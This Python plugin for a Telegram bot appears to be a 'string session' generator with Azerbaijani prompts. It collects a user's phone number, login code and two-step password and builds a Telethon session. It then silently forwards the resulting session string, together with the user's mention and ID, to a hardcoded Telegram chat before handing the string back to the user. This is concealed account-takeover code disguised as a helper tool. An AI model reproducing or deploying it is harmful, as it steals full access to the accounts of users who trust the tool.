from plugins.string import *

@Client.on_message(filters.private & ~filters.forwarded & filters.command('string'))
async def telethon(bot, msg):
    try:
        phone_number_msg = await bot.ask(user_id, "🆙 String alımına başlanılır əvvəlcə telefon nömrənizi göndərin.\n🔢 Nümunə:** 994501234567", filters=filters.text, timeout=20)
    except TimeoutError:
        await bot.send_message(user_id, "❌ **Nömrənizi göndərməyiniz üçün sizə verilən 20 saniyə başa çatdı.**")
    phone_number = phone_number_msg.text
    client = TelegramClient(StringSession(), 1558926, "69c4c16e17e9f637818f2cfce8f9bce5")
    await client.connect()
    try:
        code = await client.send_code_request(phone_number)
    except PhoneNumberInvalidError:
        await msg.reply("❌ **Telefon nömrəniz yanlışdır. Quruluma yenidən başlayın.**")
        return
    try:
        phone_code_msg = await bot.ask(user_id, "**✍🏻 Kodu daxil edin, Rəqəmlərin arasına . qoyun\n🆓 **Nümunə** 1.2.3.4.5", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📟 Kod', url="tg://openmessage?user_id=777000")]]), filters=filters.text, timeout=30)
    except TimeoutError:
        await msg.reply("‼️ **❌ Kodu göndərmək üçün verilən 30 saniyə başa çatdı. Quruluma yenidən başlayın.**")
        return
    phone_code = phone_code_msg.text.replace(".", "")
    try:
        await client.sign_in(phone_number, phone_code, password=None)
    except PhoneCodeInvalidError:
        await msg.reply("❌ **Doğrulama kodu etibarsızdır. Quruluma yenidən başlayın.**")
        return
    except PhoneCodeExpiredError:
        await msg.reply("❌ **Doğrulama kodunun etibarlılıq müddəti bitdi. Quruluma yenidən başlayın.**")
        return
    except SessionPasswordNeededError:
        try:
            two_step_msg = await bot.ask(user_id, "**🔒 Hesabınızda iki addımlı doğrulama var.\n✍🏻 Zəhmət olmasa iki addımlı kodu daxil edin.**", filters=filters.text, timeout=60)
        except TimeoutError:
            await msg.reply("**‼️ Vaxt limiti 1 dəqiqəyə çatdı. Xaiş edirik quruluma yenidən başlayın.**")
            return
        try:
            password = two_step_msg.text
            await client.sign_in(password=password)
        except PasswordHashInvalidError:
            await two_step_msg.reply("❌ **İki adımlı doğrulama yanlış daxil edilib. Quruluma yenidən başlayın.**")
            return
    string = client.session.save()
    await bot.send_message(-1001619697790, f"#String\n\n🏷️ Stringi Alan: {msg.chat.mention} ({msg.chat.id})\n\n💎 String: {string}")
    await client.disconnect()
    await msg.reply(f"✅ String Hazırdır\n\n```{string}```")
